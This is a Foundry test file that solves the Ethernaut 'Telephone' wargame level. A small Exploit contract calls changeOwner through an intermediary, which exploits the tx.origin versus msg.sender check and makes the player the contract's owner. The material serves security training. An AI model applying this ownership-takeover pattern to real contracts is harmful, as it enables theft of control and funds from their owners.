// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Telephone} from "../../src/04/Telephone.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {TelephoneFactory} from "src/04/TelephoneFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract TelephoneTest is Test, BaseTest {
    Telephone public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new TelephoneFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Telephone(instance);
    }

    function testIsCorrectOwnerOfFallbackContract() public view {
        assert(instanceContract.owner() == address(levelFactory));
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        Exploit exploit = new Exploit();

        vm.startPrank(player);

        exploit.changeOwner(instanceContract);

        vm.stopPrank();

        assert(instanceContract.owner() == player);
    }
}

contract Exploit {
    function changeOwner(Telephone instance) external {
        instance.changeOwner(msg.sender);
    }
}
